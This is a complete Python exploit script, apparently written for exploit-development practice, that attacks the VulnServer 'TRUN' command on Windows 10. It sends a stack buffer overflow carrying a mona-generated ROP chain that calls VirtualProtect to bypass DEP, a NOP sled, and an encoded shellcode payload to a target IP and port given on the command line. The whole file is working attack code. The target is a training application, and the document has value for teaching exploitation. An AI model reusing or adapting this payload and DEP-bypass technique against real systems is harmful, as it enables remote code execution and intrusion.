#!/usr/bin/env python
"""
Description: VulnServer "TRUN" Buffer Overflow w/ DEP Bypass (limited use-case)
Author: Cody Winkler
Contact: @c2thewinkler (twitter)
Date: 12/18/2019
Tested On: Windows 10 x64 (wow64)

[+] Usage: python expoit.py <IP> <PORT>

$ python exploit.py 127.0.0.1 9999
"""

import socket
import struct
import sys

host = sys.argv[1]
port = int(sys.argv[2])

shellcode =  b""
shellcode += b"\xba\x80\x08\x48\x4a\xd9\xc6\xd9\x74\x24\xf4\x5d\x33"
shellcode += b"\xc9\xb1\x52\x31\x55\x12\x83\xc5\x04\x03\xd5\x06\xaa"
shellcode += b"\xbf\x29\xfe\xa8\x40\xd1\xff\xcc\xc9\x34\xce\xcc\xae"
shellcode += b"\x3d\x61\xfd\xa5\x13\x8e\x76\xeb\x87\x05\xfa\x24\xa8"
shellcode += b"\xae\xb1\x12\x87\x2f\xe9\x67\x86\xb3\xf0\xbb\x68\x8d"
shellcode += b"\x3a\xce\x69\xca\x27\x23\x3b\x83\x2c\x96\xab\xa0\x79"
shellcode += b"\x2b\x40\xfa\x6c\x2b\xb5\x4b\x8e\x1a\x68\xc7\xc9\xbc"
shellcode += b"\x8b\x04\x62\xf5\x93\x49\x4f\x4f\x28\xb9\x3b\x4e\xf8"
shellcode += b"\xf3\xc4\xfd\xc5\x3b\x37\xff\x02\xfb\xa8\x8a\x7a\xff"
shellcode += b"\x55\x8d\xb9\x7d\x82\x18\x59\x25\x41\xba\x85\xd7\x86"
shellcode += b"\x5d\x4e\xdb\x63\x29\x08\xf8\x72\xfe\x23\x04\xfe\x01"
shellcode += b"\xe3\x8c\x44\x26\x27\xd4\x1f\x47\x7e\xb0\xce\x78\x60"
shellcode += b"\x1b\xae\xdc\xeb\xb6\xbb\x6c\xb6\xde\x08\x5d\x48\x1f"
shellcode += b"\x07\xd6\x3b\x2d\x88\x4c\xd3\x1d\x41\x4b\x24\x61\x78"
shellcode += b"\x2b\xba\x9c\x83\x4c\x93\x5a\xd7\x1c\x8b\x4b\x58\xf7"
shellcode += b"\x4b\x73\x8d\x58\x1b\xdb\x7e\x19\xcb\x9b\x2e\xf1\x01"
shellcode += b"\x14\x10\xe1\x2a\xfe\x39\x88\xd1\x69\x4c\x47\xd3\x79"
shellcode += b"\x38\x55\xe3\x68\xe4\xd0\x05\xe0\x04\xb5\x9e\x9d\xbd"
shellcode += b"\x9c\x54\x3f\x41\x0b\x11\x7f\xc9\xb8\xe6\xce\x3a\xb4"
shellcode += b"\xf4\xa7\xca\x83\xa6\x6e\xd4\x39\xce\xed\x47\xa6\x0e"
shellcode += b"\x7b\x74\x71\x59\x2c\x4a\x88\x0f\xc0\xf5\x22\x2d\x19"
shellcode += b"\x63\x0c\xf5\xc6\x50\x93\xf4\x8b\xed\xb7\xe6\x55\xed"
shellcode += b"\xf3\x52\x0a\xb8\xad\x0c\xec\x12\x1c\xe6\xa6\xc9\xf6"
shellcode += b"\x6e\x3e\x22\xc9\xe8\x3f\x6f\xbf\x14\xf1\xc6\x86\x2b"
shellcode += b"\x3e\x8f\x0e\x54\x22\x2f\xf0\x8f\xe6\x5f\xbb\x8d\x4f"
shellcode += b"\xc8\x62\x44\xd2\x95\x94\xb3\x11\xa0\x16\x31\xea\x57"
shellcode += b"\x06\x30\xef\x1c\x80\xa9\x9d\x0d\x65\xcd\x32\x2d\xac"

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x759e4002,  # POP EAX # RETN [sechost.dll] ** REBASED ** ASLR 
      0x76e4d030,  # ptr to &VirtualProtect() [IAT bcryptPrimitives.dll] ** REBASED ** ASLR
      0x74d98632,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x7610a564,  # XCHG EAX,ESI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x747b48ed,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x748991c5,  # & call esp [KERNELBASE.dll] ** REBASED ** ASLR
      0x74801c67,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x74d9976f,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x74d925da,  # XCHG EAX,EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x76108174,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x74d9abbe,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
      0x749c01ca,  # XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
      0x76f55cea,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
      0x74e00920,  # &Writable location [KERNEL32.DLL] ** REBASED ** ASLR
      0x747a2c2b,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x74d9abc0,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      0x747f9cba,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      0x7484f95c,  # PUSHAD # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

def main():

    rop_chain = create_rop_chain()
    nop_sled = "\x90"*8

    buffer = "TRUN /.:/"
    buffer += "A"*2003
    buffer += rop_chain
    buffer += nop_sled
    buffer += shellcode
    buffer += "C"*(3500-2003-len(rop_chain)-len(nop_sled)-len(shellcode))

    try:
        print "[+] Connecting to target"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024)
        print "[+] Sent payload with length: %d" % len(buffer)
        s.send(buffer)
        s.close()

    except Exception, msg:
        print "[-] Something went wrong :("
        print msg

main()
